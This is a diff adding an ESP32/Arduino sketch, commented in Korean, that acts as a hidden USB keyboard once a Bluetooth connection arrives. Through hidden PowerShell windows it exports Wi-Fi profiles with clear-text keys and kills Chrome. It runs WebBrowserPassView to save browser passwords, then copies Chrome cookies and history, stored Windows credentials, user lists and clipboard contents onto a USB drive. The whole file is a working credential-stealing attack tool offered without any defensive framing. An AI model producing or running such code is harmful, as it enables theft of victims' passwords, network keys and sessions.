@@ -1,0 +1,209 @@
+#include "USB.h"
+#include "USBHIDKeyboard.h"
+#include "BLEDevice.h"
+#include "BLEServer.h"
+#include "BLEUtils.h"
+#include "BLE2902.h"
+
+USBHIDKeyboard Keyboard;
+
+BLECharacteristic *pCharacteristic;
+bool deviceConnected = false;
+
+class MyServerCallbacks: public BLEServerCallbacks {
+  void onConnect(BLEServer* pServer) {
+    deviceConnected = true;
+  }
+  void onDisconnect(BLEServer* pServer) {
+    deviceConnected = false;
+  }
+};
+
+void setup() {
+  Keyboard.begin();
+  USB.begin();
+  
+  // BLE 초기화
+  BLEDevice::init("USB Device");
+  BLEServer *pServer = BLEDevice::createServer();
+  pServer->setCallbacks(new MyServerCallbacks());
+  
+  BLEService *pService = pServer->createService(BLEUUID((uint16_t)0x1812)); // HID Service
+  pCharacteristic = pService->createCharacteristic(
+    BLEUUID((uint16_t)0x2A4D),
+    BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_NOTIFY
+  );
+  
+  pService->start();
+  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
+  pAdvertising->addServiceUUID(BLEUUID((uint16_t)0x1812));
+  pAdvertising->start();
+  
+  delay(3000);
+  
+  // 블루투스 연결 대기
+  while(!deviceConnected) {
+    delay(100);
+  }
+  
+  // 한영 전환
+  Keyboard.press(KEY_RIGHT_ALT);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  
+  // 1. WiFi
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(1000);
+  
+  Keyboard.print("powershell -WindowStyle Hidden -Command \"$usb=(Get-Volume|Where{$_.FileSystemLabel -eq 'MYUSB'}).DriveLetter;cd \\\"${usb}:\\\\\\\";mkdir Data -Force|Out-Null;netsh wlan show profiles|Out-File Data\\\\wifi_list.txt;netsh wlan export profile folder=Data key=clear\"");
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(5000);
+  
+  // 2. 크롬 종료
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  
+  Keyboard.print("powershell -WindowStyle Hidden -Command \"taskkill /F /IM chrome.exe /T 2>$null;Start-Sleep 1;taskkill /F /IM chrome.exe /T 2>$null;Start-Sleep 1;taskkill /F /IM chrome.exe /T 2>$null;Start-Sleep 2\"");
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(5000);
+  
+  // 3. Data 폴더 경로를 클립보드에
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  
+  Keyboard.print("powershell -WindowStyle Hidden -Command \"$usb=(Get-Volume|Where{$_.FileSystemLabel -eq 'MYUSB'}).DriveLetter;Set-Clipboard ($usb+':\\Data')\"");
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(1500);
+  
+  // 4. WebBrowserPassView 실행
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(1000);
+  
+  Keyboard.print("powershell -Command \"$usb=(Get-Volume|Where{$_.FileSystemLabel -eq 'MYUSB'}).DriveLetter;Start-Process \\\"${usb}:\\\\WebBrowserPassView.exe\\\"\"");
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(3000);
+  
+  // Ctrl+A (전체 선택)
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('a');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  
+  // Ctrl+S (저장)
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('s');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(1500);
+  
+  // 경로 붙여넣기
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('v');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(300);
+  
+  Keyboard.print("\\passwords.txt");
+  delay(500);
+  
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(2000);
+  
+  Keyboard.press('y');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  
+  // 창 닫기
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  
+  // 5. 쿠키
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  
+  Keyboard.print("powershell -WindowStyle Hidden -Command \"$usb=(Get-Volume|Where{$_.FileSystemLabel -eq 'MYUSB'}).DriveLetter;cd \\\"${usb}:\\\\\\Data\\\";copy \\\"$env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\Cookies\\\" chrome_cookies -EA 0 -Force\"");
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(2000);
+  
+  // 6. 히스토리
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  
+  Keyboard.print("powershell -WindowStyle Hidden -Command \"$usb=(Get-Volume|Where{$_.FileSystemLabel -eq 'MYUSB'}).DriveLetter;cd \\\"${usb}:\\\\\\Data\\\";copy \\\"$env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History\\\" chrome_history -EA 0 -Force\"");
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(2000);
+  
+  // 7. 시스템 정보
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  
+  Keyboard.print("powershell -WindowStyle Hidden -Command \"$usb=(Get-Volume|Where{$_.FileSystemLabel -eq 'MYUSB'}).DriveLetter;cd \\\"${usb}:\\\\\\Data\\\";systeminfo|Out-File system_info.txt;whoami /all|Out-File user_info.txt;cmdkey /list|Out-File credentials.txt;net user|Out-File all_users.txt;Get-Clipboard|Out-File clipboard.txt -EA 0\"");
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(6000);
+  
+  // 8. 완료
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(100);
+  Keyboard.releaseAll();
+  delay(500);
+  
+  Keyboard.print("powershell -WindowStyle Hidden -Command \"$usb=(Get-Volume|Where{$_.FileSystemLabel -eq 'MYUSB'}).DriveLetter;'Completed: '+(Get-Date)|Out-File \\\"${usb}:\\\\\\Data\\\\completed.txt\\\"\"");
+  Keyboard.press(KEY_RETURN);
+  delay(100);
+  Keyboard.releaseAll();
+  
+  Keyboard.end();
+}
+
+void loop() {
+  // 블루투스 연결 상태 모니터링
+  if (!deviceConnected) {
+    delay(500);
+    BLEDevice::startAdvertising();
+  }
+  delay(100);
+}
